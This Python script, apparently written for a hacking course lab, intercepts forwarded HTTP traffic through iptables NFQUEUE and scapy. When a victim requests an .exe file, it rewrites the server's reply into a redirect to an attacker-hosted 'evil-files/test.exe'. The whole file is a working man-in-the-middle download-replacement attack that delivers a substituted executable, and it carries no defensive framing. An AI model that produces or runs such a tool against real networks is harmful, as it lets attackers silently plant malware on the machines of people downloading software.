#!/usr/bin/env python

import subprocess
import scapy.all as scapy
import netfilterqueue


ack_list = []

def trap_packets():
    #To trap packets from other computer
    subprocess.call(["iptables","-I","FORWARD","-j","NFQUEUE","--queue-num","0"])
    #--------------------------------------
    #To trap packets coming to my computer for testing purposes
    #subprocess.call(["iptables","-I","INPUT","-j","NFQUEUE","--queue-num","0"])
    #subprocess.call(["iptables","-I","OUTPUT","-j","NFQUEUE","--queue-num","0"])

def set_load(packet,load):
    packet[scapy.Raw].load = load
    del packet[scapy.IP].chksum
    del packet[scapy.IP].len
    del packet[scapy.TCP].chksum
    return packet

def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw):
        if scapy_packet.haslayer(scapy.TCP):
            scapy_tcp = scapy_packet[scapy.TCP]
            if scapy_tcp.dport == 80 or scapy_tcp.dport == 8080:
                if ".exe" in scapy_packet[scapy.Raw].load and "10.0.2.7" not in scapy_packet[scapy.Raw].load:
                    print("[+] exe Request")
                    ack_list.append(scapy_tcp.ack)
                    print(scapy_packet.show())
            elif scapy_tcp.sport == 80 or scapy_tcp.sport == 8080:
                if scapy_tcp.seq in ack_list:
                    ack_list.remove(scapy_tcp.seq)
                    print("[+] Replacing file")
                    modified_packet = set_load(scapy_packet,"HTTP/1.1 301 Moved Permanently\nLocation: http://10.0.2.7/evil-files/test.exe" )
                    print(scapy_packet.show())
                    packet.set_payload(str(modified_packet))
   
    packet.accept()

try:
    trap_packets()
    queue = netfilterqueue.NetfilterQueue()
    queue.bind(0,process_packet)
    queue.run()
except KeyboardInterrupt:
    subprocess.call(["iptables","--flush"])
    print("[-] Flushing iptables and quitting....")
